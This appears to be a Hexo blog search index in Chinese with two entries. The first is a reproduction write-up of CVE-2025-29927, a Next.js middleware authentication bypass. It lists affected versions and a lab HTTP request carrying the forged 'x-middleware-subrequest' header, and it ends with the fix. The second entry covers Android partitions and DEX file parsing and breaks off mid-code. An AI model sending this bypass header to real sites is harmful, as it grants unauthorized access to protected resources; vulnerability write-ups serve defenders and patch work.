<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2025-29927 Next.js Middleware鉴权绕过漏洞</title>
    <link href="/2025/03/28/CVE-2025-29927%EF%BC%9ANext-js-Middleware%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/28/CVE-2025-29927%EF%BC%9ANext-js-Middleware%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h3><p>Next.js 是基于 React 的全栈框架，支持服务端渲染、静态生成和 API 开发，提供开箱即用的高性能 Web 应用解决方案。Next.js Middleware 是在请求到达前运行的轻量级代码，用于拦截和修改请求&#x2F;响应，如重定向、路由保护或头信息处理。</p><h3 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h3><p>Next.js 在处理 Middleware 鉴权逻辑时，未能正确验证 <code>x-middleware-subrequest</code> 请求头，攻击者可伪造该请求头绕过授权检查，从而未授权访问受保护资源或敏感数据。</p><h3 id="0x03漏洞版本"><a href="#0x03漏洞版本" class="headerlink" title="0x03漏洞版本"></a>0x03漏洞版本</h3><p>15.* &lt;&#x3D; Next.js &lt;15.2.3</p><p>14.* &lt;&#x3D; Next.js &lt;14.2.25</p><p>11.1.4 &lt;&#x3D; Next.js &lt;&#x3D; 13.5.6</p><h3 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h3><p>网上有相应的docker环境（<a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927</a>）</p><p>为了方便漏洞分析，拿了docker里面的源码进行本地搭建。</p><p><img src="1743139015519-fa704151-6b2d-41c1-9bf0-79ad3f6462a5.png"></p><p><img src="1743139087476-73e743ff-54c2-467f-af6d-697fdf178474.png"></p><h3 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h3><p>访问 &#x2F; 下的路径，会重定向到login进行登录认证。</p><p><img src="1743139218605-fb229c9f-6ec4-4bc1-aa46-bc1a4ebb7c69.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.107</span>:<span class="hljs-number">3000</span><br>Cache<span class="hljs-literal">-Control</span>: max<span class="hljs-literal">-age</span>=<span class="hljs-number">0</span><br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">134.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed<span class="hljs-literal">-exchange</span>;v=b3;q=<span class="hljs-number">0.7</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.9</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.8</span>,en;q=<span class="hljs-number">0.7</span><br>Connection: close<br></code></pre></td></tr></table></figure><p>加入添加 x-middleware-subrequest 请求头，值为middleware:middleware:middleware:middleware:middleware。</p><p><img src="1743139483194-e897569f-9712-4a07-86d5-e3b663cec015.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">1.107</span>:<span class="hljs-number">3000</span><br>Cache<span class="hljs-literal">-Control</span>: max<span class="hljs-literal">-age</span>=<span class="hljs-number">0</span><br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">134.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed<span class="hljs-literal">-exchange</span>;v=b3;q=<span class="hljs-number">0.7</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.9</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.8</span>,en;q=<span class="hljs-number">0.7</span><br>x<span class="hljs-literal">-middleware-subrequest</span>: middleware:middleware:middleware:middleware:middleware<br>Connection: close<br><br><br></code></pre></td></tr></table></figure><h3 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h3><h3 id="0x07-修复方式"><a href="#0x07-修复方式" class="headerlink" title="0x07 修复方式"></a>0x07 修复方式</h3><p>升级至15.2.3版本</p><h3 id="0x08-参考文章"><a href="#0x08-参考文章" class="headerlink" title="0x08 参考文章"></a>0x08 参考文章</h3><p><a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Next.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android分析</title>
    <link href="/2025/03/22/android%E5%88%86%E6%9E%90/"/>
    <url>/2025/03/22/android%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h4 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">broadcast receiver<br><span class="hljs-attribute">content</span> provider<br>service<br>activity  是一个会话窗口可以看成一个屏幕，弹出的界面<br></code></pre></td></tr></table></figure><p>url寻找（通过正则匹配）</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">grep <span class="hljs-operator">-</span>ohr <span class="hljs-operator">-</span>E <span class="hljs-string">&quot;https?://[a-zA-Z0-9<span class="hljs-char escape_">\.</span><span class="hljs-char escape_">\/</span>_&amp;=@$%?~#-]*&quot;</span> <span class="hljs-operator">/</span>Kevin<span class="hljs-operator">/</span>com.sogou.<span class="hljs-built_in">map</span>.android.maps<span class="hljs-symbol">/</span> |sort|uniq <span class="hljs-operator">&gt;</span><span class="hljs-operator">&gt;</span> test.txt<br><br></code></pre></td></tr></table></figure><p>内核：</p><p>android系统的分区</p><ul><li>&#x2F;boot分区：该分区主要包含android kernel镜像和ramdisk（一种将RAM模拟为硬盘的技术，提高访问速度）。</li><li>&#x2F;system分区：该分区主要存放Android框架及其相关配置，包含系统预装的app。</li><li>&#x2F;recovery分区：该分区主要是备份的分区</li><li>&#x2F;data 用户数据的存储区域</li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/app/com.xxxx/以包名存放应用安装文件，包括base.apk/lib</span><br>/<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-keyword">data</span>/com.xxxx/存放应用数据，包括sp、db等</span><br>/<span class="hljs-class"><span class="hljs-keyword">data</span>/dalvik-cache 以包名存放优化过的应用dex文件</span><br></code></pre></td></tr></table></figure><ul><li>&#x2F;cache分区：Android系统缓存区域，保存系统最常访问的数据和应用程序。</li><li>&#x2F;misc分区：此分区包含一些系统功能设置开关和数据，比如usb设置</li><li>sdcard分区：外置存储分区</li><li>&#x2F;vendor分区：厂商定制的分区，厂商的某些系统升级可以通过这个分区来实现</li></ul><h5 id="DEX-文件格式解析"><a href="#DEX-文件格式解析" class="headerlink" title="DEX 文件格式解析"></a>DEX 文件格式解析</h5><p>在 Android 中，不管是 Dalvik 还是 Art，和 JVM 的区别还是很大的。Android 系统并不直接使用 Class 文件，而是将所有的 Class 文件聚合打包成 <strong>DEX</strong> 文件，DEX 文件相比单个单个的 Class 文件更加紧凑，可以直接在 Android Runtime 下执行</p><p><strong>DEX 文件的生成</strong></p><p><img src="image-20240303184252009.png" alt="image-20240303184252009"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada">header : <span class="hljs-type">DEX</span> 文件头，记录了一些当前文件的信息以及其他数据结构在文件中的偏移量<br>string_ids : 字符串的偏移量<br>type_ids : 类型信息的偏移量<br>proto_ids : 方法声明的偏移量<br>field_ids : 字段信息的偏移量<br>method_ids : 方法信息（所在类，方法声明以及方法名）的偏移量<br>class_def : 类信息的偏移量<br>data : ： 数据区<br>link_data : 静态链接数据区<br></code></pre></td></tr></table></figure><p><strong>header</strong></p><p>DEX 文件头部分的具体格式可以参考 DexFile.h 中的定义：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">struct DexHeader &#123;<br>    u1  magic[<span class="hljs-number">8</span>];           <span class="hljs-comment">// 魔数</span><br>    u4  checksum;           <span class="hljs-comment">// adler 校验值</span><br>    u1  signature[kSHA1DigestLen]; <span class="hljs-comment">// sha1 校验值</span><br>    u4  fileSize;           <span class="hljs-comment">// DEX 文件大小</span><br>    u4  headerSize;         <span class="hljs-comment">// DEX 文件头大小</span><br>    u4  endianTag;          <span class="hljs-comment">// 字节序</span><br>    u4  linkSize;           <span class="hljs-comment">// 链接段大小</span><br>    u4  linkOff;            <span class="hljs-comment">// 链接段的偏移量</span><br>    u4  mapOff;             <span class="hljs-comment">// DexMapList 偏移量</span><br>    u4  <span class="hljs-built_in">string</span>IdsSize;      <span class="hljs-comment">// DexStringId 个数</span><br>    u4  <span class="hljs-built_in">string</span>IdsOff;       <span class="hljs-comment">// DexStringId 偏移量</span><br>    u4  typeIdsSize;        <span class="hljs-comment">// DexTypeId 个数</span><br>    u4  typeIdsOff;         <span class="hljs-comment">// DexTypeId 偏移量</span><br>    u4  protoIdsSize;       <span class="hljs-comment">// DexProtoId 个数</span><br>    u4  protoIdsOff;        <span class="hljs-comment">// DexProtoId 偏移量</span><br>    u4  fieldIdsSize;       <span class="hljs-comment">// DexFieldId 个数</span><br>    u4  fieldIdsOff;        <span class="hljs-comment">// DexFieldId 偏移量</span><br>    u4  methodIdsSize;      <span class="hljs-comment">// DexMethodId 个数</span><br>    u4  methodIdsOff;       <span class="hljs-comment">// DexMethodId 偏移量</span><br>    u4  classDefsSize;      <span class="hljs-comment">// DexCLassDef 个数</span><br>    u4  classDefsOff;       <span class="hljs-comment">// DexClassDef 偏移量</span><br>    u4  dataSize;           <span class="hljs-comment">// 数据段大小</span><br>    u4  dataOff;            <span class="hljs-comment">// 数据段偏移量</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的 <code>u</code> 表示无符号数，<code>u1</code> 就是 8 位无符号数，<code>u4</code> 就是 32 位无符号数。</p><p><code>magic</code> 一般是常量，用来标记 DEX 文件，它可以分解为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">文件标识 dex <span class="hljs-punctuation">+</span> 换行符 <span class="hljs-punctuation">+</span> DEX 版本 <span class="hljs-punctuation">+</span> <span class="hljs-number">0</span>  <span class="hljs-comment">//字符串格式为 dex\n035\0，十六进制为 0x6465780A30333500。</span><br></code></pre></td></tr></table></figure><p><strong>checksum</strong> 是对去除 <code>magic</code> 、 <code>checksum</code> 以外的文件部分作 alder32 算法得到的校验值，用于判断 DEX 文件是否被篡改。</p><p><strong>signature</strong> 是对除去 <code>magic</code> 、 <code>checksum</code> 、 <code>signature</code> 以外的文件部分作 sha1 得到的文件哈希值。</p><p><strong>endianTag</strong> 用于标记 DEX 文件是大端表示还是小端表示。由于 DEX 文件是运行在 Android 系统中的，所以一般都是小端表示，这个值也是恒定值 <code>0x12345678</code>。</p><p><strong>string_ids</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">struct DexStringId &#123;<br>    u4 stringDataOff;<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>string_ids</code> 是一个偏移量数组，<code>stringDataOff</code> 表示每个字符串在 data 区的偏移量。根据偏移量在 data 区拿到的数据中，第一个字节表示的是字符串长度，后面跟着的才是字符串数据。这块逻辑比较简单，直接看一下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexString</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexString&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int stringIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">string_ids__size</span>;<br>        <span class="hljs-comment">//尝试获取dex对象的DexHeader属性中的string_ids_size字段。string_ids_size字段通常表示DEX文件中字符串标识符段的大小。在DEX文件格式中，字符串标识符用于以字符串形式存储类名、方法名、字段名等。</span><br>        <span class="hljs-comment">//dex对象具有getDexHeader()方法，该方法返回包含string_ids_size字段的对象。</span><br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; stringIdsSize; i++) &#123;<br>            int string_data_off = reader.<span class="hljs-title function_">readInt</span>();<br>            byte size = dexData[string_data_off]; <span class="hljs-comment">// 第一个字节表示该字符串的长度，之后是字符串内容</span><br>            <span class="hljs-title class_">String</span> string_data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-title class_">Utils</span>.<span class="hljs-title function_">copy</span>(dexData, string_data_off + <span class="hljs-number">1</span>, size));<br>            <span class="hljs-title class_">DexString</span> string = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexString</span>(string_data_off, string_data);<br>            dexStrings.<span class="hljs-title function_">add</span>(string);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;string[%d] data: %s&quot;</span>, i, string.<span class="hljs-property">string_data</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>type_ids</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">struct DexTypeId &#123;<br>    u4  descriptorIdx;<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>type_ids</code> 表示的是类型信息，<code>descriptorIdx</code> 指向 <code>string_ids</code> 中元素。根据索引直接在上一步读取到的字符串池即可解析对应的类型信息，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexType</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexTypeId&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int typeIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">type_ids__size</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; typeIdsSize; i++) &#123;<br>            int descriptor_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            <span class="hljs-title class_">DexTypeId</span> dexTypeId = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexTypeId</span>(descriptor_idx, dexStringIds.<span class="hljs-title function_">get</span>(descriptor_idx).<span class="hljs-property">string_data</span>);<br>            dexTypeIds.<span class="hljs-title function_">add</span>(dexTypeId);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;type[%d] data: %s&quot;</span>, i, dexTypeId.<span class="hljs-property">string_data</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>proto_ids</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">DexProtoId</span> &#123;<br>    u4  shortyIdx;          <span class="hljs-comment">/* index into stringIds for shorty descriptor */</span><br>    u4  returnTypeIdx;      <span class="hljs-comment">/* index into typeIds list for return type */</span><br>    u4  parametersOff;      <span class="hljs-comment">/* file offset to type_list for parameter types */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>proto_ids</code> 表示方法声明信息，它包含以下三个变量：</p><ul><li>shortyIdx : 指向 string_ids ，表示方法声明的字符串</li><li>returnTypeIdx : 指向 type_ids ，表示方法的返回类型</li><li>parametersOff ： 方法参数列表的偏移量</li></ul><p>方法参数列表的数据结构在 DexFile.h 中用 <code>DexTypeList</code> 来表示：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">DexTypeList</span> &#123;<br>    u4  size;               <span class="hljs-comment">/* #of entries in list */</span><br>    DexTypeItem list[<span class="hljs-number">1</span>];    <span class="hljs-comment">/* entries */</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-type">DexTypeItem</span> &#123;<br>    u2  typeIdx;            <span class="hljs-comment">/* index into typeIds */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>size</code> 表示方法参数的个数，参数用 <code>DexTypeItem</code> 表示，它只有一个属性 <code>typeIdx</code>，指向 <code>type_ids</code> 中对应项。具体的解析代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexProto</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexProto&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int protoIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">proto_ids__size</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; protoIdsSize; i++) &#123;<br>            int shorty_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            int return_type_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            int parameters_off = reader.<span class="hljs-title function_">readInt</span>();<br><br>            <span class="hljs-title class_">DexProtoId</span> dexProtoId = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexProtoId</span>(shorty_idx, return_type_idx, parameters_off);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;proto[%d]: %s %s %d&quot;</span>, i, dexStringIds.<span class="hljs-title function_">get</span>(shorty_idx).<span class="hljs-property">string_data</span>,<br>                    dexTypeIds.<span class="hljs-title function_">get</span>(return_type_idx).<span class="hljs-property">string_data</span>, parameters_off);<br><br>            <span class="hljs-keyword">if</span> (parameters_off &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-title function_">parseDexProtoParameters</span>(parameters_off);<br>            &#125;<br><br>            dexProtos.<span class="hljs-title function_">add</span>(dexProtoId);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>field_ids</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexFieldId &#123;<br>    u2  classIdx;           /* index into typeIds list for defining class */<br>    u2  typeIdx;            /* index into typeIds for field type */<br>    u4  nameIdx;            /* index into stringIds for field name */<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>field_ids</code> 表示的是字段信息，指明了字段所在的类，字段的类型以及字段名称，在 <code>DexFile.h</code> 中定义为 <code>DexFieldId</code> , 其各个字段含义如下：</p><ul><li>classIdx : 指向 type_ids ，表示字段所在类的信息</li><li>typeIdx : 指向 ype_ids ，表示字段的类型信息</li><li>nameIdx : 指向 string_ids ，表示字段名称</li></ul><p>解析结果</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">parse DexField<br>field[0]: LHello;-&gt;HELLO_WORLD;Ljava/lang/String;<br>field[1]: Ljava/lang/System;-&gt;out;Ljava/io/PrintStream;<br></code></pre></td></tr></table></figure><p><strong>method_ids</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexMethodId &#123;<br>    u2  classIdx;           /* index into typeIds list for defining class */<br>    u2  protoIdx;           /* index into protoIds for method prototype */<br>    u4  nameIdx;            /* index into stringIds for method name */<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>method_ids</code> 指明了方法所在的类、方法声明以及方法名。在 DexFile.h 中用 <code>DexMethodId</code> 表示该项，其属性含义如下：</p><ul><li>classIdx : 指向 type_ids ，表示类的类型</li><li>protoIdx : 指向 type_ids ，表示方法声明</li><li>nameIdx : 指向 string_ids ，表示方法名</li></ul><p><strong>class_def</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript">struct DexClassDef &#123;<br>    u4  classIdx;           /* index <span class="hljs-keyword">into</span> typeIds <span class="hljs-keyword">for</span> this <span class="hljs-built_in">class</span> */<br>    u4  accessFlags;<br>    u4  superclassIdx;      /* index <span class="hljs-keyword">into</span> typeIds <span class="hljs-keyword">for</span> superclass */<br>    u4  interfacesOff;      /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> DexTypeList */<br>    u4  sourceFileIdx;      /* index <span class="hljs-keyword">into</span> stringIds <span class="hljs-keyword">for</span> source <span class="hljs-built_in">file</span> <span class="hljs-built_in">name</span> */<br>    u4  annotationsOff;     /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> annotations_directory_item */<br>    u4  classDataOff;       /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> class_data_item */<br>    u4  staticValuesOff;    /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> DexEncodedArray */<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>class_def</code> 是 DEX 文件结构中最复杂也是最核心的部分，它表示了类的所有信息，对应 <code>DexFile.h</code> 中的 <code>DexClassDef</code> :</p><ul><li>classIdx : 指向 type_ids ，表示类信息</li><li>accessFlags : 访问标识符</li><li>superclassIdx : 指向 type_ids ，表示父类信息</li><li>interfacesOff : 指向 DexTypeList 的偏移量，表示接口信息</li><li>sourceFileIdx : 指向 string_ids ，表示源文件名称</li><li>annotationOff : 注解信息</li><li>classDataOff : 指向 DexClassData 的偏移量，表示类的数据部分</li><li>staticValueOff :指向 DexEncodedArray 的偏移量，表示类的静态数据</li></ul><p><strong>DefCLassData</strong></p><p>重点是 <code>classDataOff</code> 这个字段，它包含了一个类的核心数据，在 Android 源码中定义为 <code>DexClassData</code> ，它不在 DexFile.h 中了，而是在 DexClass.h 中：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexClassData &#123;<br>    DexClassDataHeader header;<br>    DexField*          staticFields;<br>    DexField*          instanceFields;<br>    DexMethod*         directMethods;<br>    DexMethod*         virtualMethods;<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>DexClassDataHeader</code> 定义了类中字段和方法的数目，它也定义在 DexClass.h 中：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexClassDataHeader &#123;<br>    u4 staticFieldsSize;<br>    u4 instanceFieldsSize;<br>    u4 directMethodsSize;<br>    u4 virtualMethodsSize;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>staticFieldsSize : 静态字段个数</li><li>instanceFieldsSize : 实例字段个数</li><li>directMethodsSize : 直接方法个数</li><li>virtualMethodsSize : 虚方法个数</li></ul><p>在读取的时候要注意这里的数据是 LEB128 类型。它是一种可变长度类型，每个 LEB128 由 1~5 个字节组成，每个字节只有 7 个有效位。如果第一个字节的最高位为 1，表示需要继续使用第 2 个字节，如果第二个字节最高位为 1，表示需要继续使用第三个字节，依此类推，直到最后一个字节的最高位为 0，至多 5 个字节。除了 LEB128 以外，还有无符号类型 ULEB128。</p><p>那么为什么要使用这种数据结构呢？我们都知道 Java 中 int 类型都是 4 字节，32 位的，但是很多时候根本用不到 4 个字节，用这种可变长度的结构，可以节省空间。对于运行在 Android 系统上来说，能多省一点空间肯定是好的。下面给出了 Java 读取 ULEB128 的代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 